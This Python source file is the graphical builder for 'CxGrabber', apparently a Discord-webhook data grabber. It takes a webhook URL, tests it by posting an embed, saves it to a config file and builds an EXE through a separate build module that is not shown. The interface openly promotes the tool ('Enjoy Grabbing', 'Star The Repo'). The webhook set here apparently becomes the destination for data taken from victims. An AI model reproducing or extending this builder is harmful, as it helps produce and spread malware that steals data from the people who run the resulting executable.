import asyncio
import ctypes

import Components.ChangeComp as chcomp
from threading import Thread

import aiohttp
import customtkinter as ctk
import discord
from discord import Webhook


def Mbox(title, text, style):
    return ctypes.windll.user32.MessageBoxW(0, text, title, style)


def sendToWebhook():
    avurl = "https://cdn.discordapp.com/attachments/1179468939101745152/1180208308221661256/Your_paragraph_text_1.png?ex=657c95a3&is=656a20a3&hm=3ca435b0248245694ad79cffd78864007252382566c4b48b6fea7808ee45dd96&"
    try:
        async def anything(webhook2):
            async with aiohttp.ClientSession() as session:
                message = "               Webhook Working \n\nCxG Made By AnonCx & DarkBlade"
                user = "CxGrabber"
                numBr = 1
                for i in range(1):
                    numBr = numBr + 1
                    webhook = Webhook.from_url(webhook2, session=session)
                    embed = discord.Embed(
                        title=message)
                    await webhook.send(embed=embed, username=user, avatar_url=avurl)

        webhook2 = WebhookE.get()

        loop = asyncio.new_event_loop()
        loop.run_until_complete(anything(webhook2))
        loop.close()
        Mbox("CxGrabber", "WebHook Working", 0)

    except:
        Mbox("CxGrabber", "WebHook Invalid", 0)


def BuildF():
    with open("config.txt", "w") as f:
        f.write(f"{WebhookE.get()}")
    f.close()
    chcomp.Build()


# System Settings
ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("dark-blue")

# App Settings
app = ctk.CTk()
app.title("CxGrabber")
app.geometry("700x500")
app.resizable(height=False, width=False)
app.font = ctk.CTkFont(size=20)

# Variables


# Variables

MainAFrame = ctk.CTkFrame(app, corner_radius=10, border_color=("#00ffd0", "#BA2ADB"), border_width=1, height=30,
                          fg_color='transparent')
MainAFrame.pack(pady=10)

# MainMenu Text
MainText = ctk.CTkLabel(MainAFrame, text="CxGrabber", font=("Trebuchet MS", 30))
MainText.pack(pady=10, padx=10)

tabview = ctk.CTkTabview(app, width=700, height=600, border_color="#BA2ADB", border_width=2,
                         segmented_button_selected_color="#BA2ADB")
tabview.pack(padx=20, pady=20)

tabview.add("Info")
tabview.add("Settings")
tabview.add("Build")

Settings = tabview.tab("Settings")
Build = tabview.tab("Build")

tabview.set("Info")

# //////////////////////////////////////////////////// Info Tab ///////////////////////////////////////////////////////////////////////////////////////////////

InfoText = ctk.CTkLabel(tabview.tab("Info"), text="Welcome To CxGrabber", font=app.font,
                        text_color="white")
InfoText.grid(row=0, column=0, columnspan=5, pady=10)

InfoText2 = ctk.CTkLabel(tabview.tab("Info"),
                         text="Grabber Made By AnonCx & DarkBlade", font=app.font,
                         text_color="white")
InfoText2.grid(row=1, column=0, columnspan=5, pady=10)

InfoText3 = ctk.CTkLabel(tabview.tab("Info"),
                         text="Instructions: \n[Just Click Threw The Different Tabs (Info, Settings)\nSelect The Features You Want To Use\nGo To The Build Tab And Click Build]",
                         font=app.font,
                         text_color="white")
InfoText3.grid(row=2, column=0, padx=75, columnspan=5, pady=10)

InfoText4 = ctk.CTkLabel(tabview.tab("Info"),
                         text="Recommending The Grabber Would Help Us A Lot\nAnd Star The Repo ^^", font=app.font,
                         text_color="white")
InfoText4.grid(row=3, column=0, columnspan=5, pady=10)

InfoText5 = ctk.CTkLabel(tabview.tab("Info"),
                         text="Enjoy Grabbing ~AnonCx", font=app.font,
                         text_color="white")
InfoText5.grid(row=4, column=0, columnspan=5, pady=10)

# //////////////////////////////////////////////////// Info Tab ///////////////////////////////////////////////////////////////////////////////////////////////

WebhookE = ctk.CTkEntry(Settings, placeholder_text="Enter Webhook", height=38, font=app.font,
                        text_color="white",
                        border_width=1, border_color=("#00ffd0", "#BA2ADB"), width=1000)
WebhookE.pack(padx=20, pady=(0, 20))

TestWebhook = ctk.CTkButton(Settings, text="Test Your Webhook", height=38, width=609,
                            font=app.font,
                            fg_color="transparent", hover_color="#BA2ADB", text_color_disabled="grey", border_width=1,
                            border_color="#BA2ADB",
                            command=lambda: Thread(
                                target=sendToWebhook()).start())
TestWebhook.pack()

# //////////////////////////////////////////////////// Info Tab ///////////////////////////////////////////////////////////////////////////////////////////////

BuildB = ctk.CTkButton(Build, text="Build EXE", height=38, width=609,
                       font=app.font,
                       fg_color="transparent", hover_color="#BA2ADB", text_color_disabled="grey", border_width=1,
                       border_color="#BA2ADB",
                       command=BuildF)
BuildB.pack()

app.mainloop()
